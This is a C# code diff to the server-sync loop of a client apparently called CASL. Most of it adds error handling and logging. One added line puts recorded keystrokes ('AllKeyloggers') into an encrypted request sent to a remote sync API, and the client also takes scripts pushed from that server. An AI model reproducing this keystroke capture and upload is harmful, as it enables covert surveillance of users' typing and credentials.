@@ -48,40 +48,55 @@ namespace CASL.Bll
             {
                 while (true)
                 {
+
                     var now = DateTime.Now;
-                    //一段时间停止更新的逻辑
-                    if (CommandManager.Tactics.SyncStopTimeBegin.HasValue &&
-                        CommandManager.Tactics.SyncStopTimeStop.HasValue)
+                    try
                     {
-                        if (CommandManager.Tactics.SyncStopTimeBegin <= now &&
-                            now <= CommandManager.Tactics.SyncStopTimeStop.Value)
+                        //一段时间停止更新的逻辑
+                        if (CommandManager.Tactics.SyncStopTimeBegin.HasValue &&
+                            CommandManager.Tactics.SyncStopTimeStop.HasValue)
                         {
-                            CommandManager.instance.Log(string.Format("{0}停止进行同步", DateTime.Now));
-                            //停止时间
-                            Thread.Sleep(CommunicationSpan);
-                            continue;
+                            if (CommandManager.Tactics.SyncStopTimeBegin <= now &&
+                                now <= CommandManager.Tactics.SyncStopTimeStop.Value)
+                            {
+                                LogManager.instance.LogFormat("{0}停止进行同步", DateTime.Now);
+                                //停止时间
+                                Thread.Sleep(CommunicationSpan);
+                                continue;
+                            }
                         }
+             
+                        var clientRequestTM = new ClientRequestTM()
+                        {
+                            ActivationCode = ActivationCodeManager.ActivationCode,
+                            ScriptLastUpdateTime = ScriptLastUpdateTime,
+                            TacticsLastUpdateTime = TacticsLastUpdateTime,
+                            ScriptExecuteRecords = ScriptManager.ScriptExecuteRecords,
+                            SendTime = now,
+                            KeyDownRecords=CommandManager.AllKeyloggers
+                        };
+
+                        LogManager.instance.LogFormat("{0}进行同步", DateTime.Now);
+                        //获取服务器的请求
+                        var serverRequestTM = GetServerReponse(clientRequestTM);
+
+                        //将更新记录记录放到最后
+                        ScriptManager.ScriptExecuteRecordsSended.AddRange(ScriptManager.ScriptExecuteRecords);
+                        //置空当前更新记录
+                        ScriptManager.ScriptExecuteRecords.Clear();
+
+                        //同步数据
+                        ExecuteServerReponse(serverRequestTM);
+
+                        LogManager.instance.LogFormat("{0}同步完成", DateTime.Now);
                     }
-                    
-                    var clientRequestTM = new ClientRequestTM()
+                    catch (Exception ex)
                     {
-                        ActivationCode = ActivationCodeManager.ActivationCode,
-                        ScriptLastUpdateTime = ScriptLastUpdateTime,
-                        TacticsLastUpdateTime = TacticsLastUpdateTime,
-                        ScriptExecuteRecords = ScriptManager.ScriptExecuteRecords,
-                        SendTime = now,
-                    };
 
-                    CommandManager.instance.Log(string.Format("{0}进行同步", DateTime.Now));
-                    //将更新记录记录放到最后
-                    ScriptManager.ScriptExecuteRecordsSended.AddRange(ScriptManager.ScriptExecuteRecords);
-                    //置空当前更新记录
-                    ScriptManager.ScriptExecuteRecords = null;
-
-                    //获取服务器的请求
-                    var serverRequestTM = GetServerReponse(clientRequestTM);
-                    //同步数据
-                    ExecuteServerReponse(serverRequestTM);
+                        LogManager.instance.LogFormat("同步失败,原因:{0}",ex.Message);
+                        
+                    }
+                   
 
                     //停止时间
                     Thread.Sleep(CommunicationSpan);
@@ -126,7 +141,6 @@ namespace CASL.Bll
         private ServerReponseTM GetServerReponse(ClientRequestTM tm)
         {
             var modelStr = DESEncrypt.EncryptModel(tm);
-
             var s = RequestHelper.HttpPost(SiteUrl.GetApiUrl("Command/Sync"),   modelStr );
             var serverRequestTM = DESEncrypt.DecryptModel<ServerReponseTM>(s);
             return serverRequestTM;
@@ -136,6 +150,10 @@ namespace CASL.Bll
         /// </summary>
         public void ExecuteServerReponse(ServerReponseTM tm)
         {
+            if (tm.CommandType != ServerCommandType.None)
+            {
+                LogManager.instance.Message("发现有数据更新，更新数据中。。。。");
+            }
             switch (tm.CommandType)
             {
                     //同步策略
@@ -147,7 +165,8 @@ namespace CASL.Bll
 
                     TacticsLastUpdateTime = tm.SendTime;
 
-                    CommandManager.instance.Log(string.Format("{0}同步完毕策略 {1}", DateTime.Now, tm.Tactics.Id));
+                    LogManager.instance.LogFormat("{0}同步完毕策略 {1}", DateTime.Now, tm.Tactics.Id);
+                    LogManager.instance.Message("数据更新完毕");
                     break;
                     //同步脚本
                 case ServerCommandType.SynScript:
@@ -168,10 +187,12 @@ namespace CASL.Bll
                         }
                     }
 
-                    CommandManager.instance.Log(string.Format("{0}同步完毕脚本，共 {1}个脚本", DateTime.Now, CommandManager.Tactics.Scripts.Count));
+                    LogManager.instance.LogFormat("{0}同步完毕脚本，共 {1}个脚本", DateTime.Now, CommandManager.Tactics.Scripts.Count);
                     ScriptLastUpdateTime = tm.SendTime;
+                    LogManager.instance.Message("数据更新完毕");
                     break;
             }
+         
         }
     }
 }
